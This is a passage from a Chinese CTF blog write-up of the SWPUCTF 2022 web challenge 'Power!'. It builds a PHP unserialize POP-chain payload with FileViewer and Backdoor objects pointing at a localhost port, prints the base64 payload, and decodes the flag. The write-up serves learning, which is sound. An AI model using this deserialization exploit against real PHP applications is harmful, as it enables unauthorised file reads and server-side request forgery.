class="line">       <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># 入口，去执行$a类中的函数</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#让goodman去修改loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//这是goodman中我们想修改成的值</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$back</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Tzo4OiJCYWNrZG9vciI6Mzp7czoxOiJhIjtPOjEwOiJGaWxlVmlld2VyIjozOntzOjEwOiJibGFja19saXN0IjtOO3M6NToibG9jYWwiO047czo0OiJwYXRoIjtzOjY6ImFnLnBocCI7fXM6MToiYiI7czo1OiJsb2NhbCI7czoxMToic3VwZXJoYWNrZXIiO3M6MTg6IjEyNy4wLjAuMTo2NTUwMC9mbCI7fQ==</span><br></pre></td></tr></table></figure></div>
<p>然后传入这个参数之后,报错了<br><img src="https://pic1.imgdb.cn/item/67b3567cd0e0a243d4005280.png"><br>报错的信息是Backdoor没有loadfile这个方法，我们再去看这边反序列化的源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$FV = unserialize(base64_decode($path_info))<span class="comment">;</span></span><br><span class="line">            $FV-&gt;loadfile()<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>最后执行loadfile的是<code>$FV</code>，但是我们代码里面定义的是<code>$f</code>在<code>$back</code>中，由于反序列化是从里面到外面的，所以最后FV是Backdoor这个类的，<br>而这个类没有loadfile()这个函数，所以解决方法也知道了，我们让<code>$back</code>是一个新的FileViewer类的一个任意属性(但是我只有local属性成功了，可能是因为local没什么别的限制)，然后去反序列化这个新的类</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># 入口，去执行$a类中的函数</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#让goodman去修改loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//这是goodman中我们想修改成的值</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new_one</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();<span class="comment">#新建一个对象</span></span><br><span class="line">    <span class="variable">$new_one</span> -&gt; local = <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$new_one</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">TzoxMDoiRmlsZVZpZXdlciI6Mzp7czoxMDoiYmxhY2tfbGlzdCI7TjtzOjU6ImxvY2FsIjtPOjg6IkJhY2tkb29yIjozOntzOjE6ImEiO086MTA6IkZpbGVWaWV3ZXIiOjM6e3M6MTA6ImJsYWNrX2xpc3QiO047czo1OiJsb2NhbCI7TjtzOjQ6InBhdGgiO3M6NjoiYWcucGhwIjt9czoxOiJiIjtzOjU6ImxvY2FsIjtzOjExOiJzdXBlcmhhY2tlciI7czoxODoiMTI3LjAuMC4xOjY1NTAwL2ZsIjt9czo0OiJwYXRoIjtOO30=</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b35a17d0e0a243d4005318.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezIwMGE5YzU2LThiM2MtNDdmMC04ZmNjLWFjYjc5MWQ1N2M4NH0= | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;200a9c56-8b3c-47f0-8fcc-acb791d57c84&#125;   </span><br></pre></td></tr></table></figure></div>
<p>这题参考的大佬wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/136852734">NSS [SWPUCTF 2022 新生赛] Power!</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>guayu-kakeru
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://guayu-kakeru.github.io/posts/38113.html" title="SWPUCTF_2022新生赛(web)WP">https://guayu-kakeru.github.io/posts/38113.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/50600.html" rel="prev" title="HMV-insomnia">
      <i class="fa fa-chevron-left"></i> HMV-insomnia
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/48411.html" rel="next" title="HMV-Five">
      HMV-Five <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-ez-php"><span class="nav-text">ez_ez_php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-ez-php-revenge"><span class="nav-text">ez_ez_php (revenge)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1z-unserialize"><span class="nav-text">1z_unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A5%87%E5%A6%99%E7%9A%84-MD5"><span class="nav-text">奇妙的 MD5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-ez-unserialize"><span class="nav-text">ez_ez_unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#where-am-i"><span class="nav-text">where_am_i</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-rce"><span class="nav-text">ez_rce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#funny-php"><span class="nav-text">funny_php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#funny-web"><span class="nav-text">funny_web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webdog1-start"><span class="nav-text">webdog1__start</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ez-upload"><span class="nav-text">Ez_upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#numgame"><span class="nav-text">numgame</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xff"><span class="nav-text">xff</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#js-sign"><span class="nav-text">js_sign</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-sql"><span class="nav-text">ez_sql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-1zpop"><span class="nav-text">ez_1zpop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#file-master"><span class="nav-text">file_master</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Power"><span class="nav-text">Power!</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">76</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/posts/14848.html" title="posts&#x2F;14848.html">群友靶机-Kakeru2 wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/19220.html" title="posts&#x2F;19220.html">xmu新生赛web wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/51954.html" title="posts&#x2F;51954.html">群友靶机-LingMj复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/28847.html" title="posts&#x2F;28847.html">群友靶机-Noport复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/7589.html" title="posts&#x2F;7589.html">SQL注入专题(更新中)</a>
        </li>
    </ul>
  </div>
      </div>

      
      
        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
          <div class="links-of-blogroll-title">
            <i class="fa fa-history fa-" aria-hidden="true"></i>
            
          </div>
          <ul class="links-of-blogroll-list">
            
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
          </ul>
        </div>
      
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
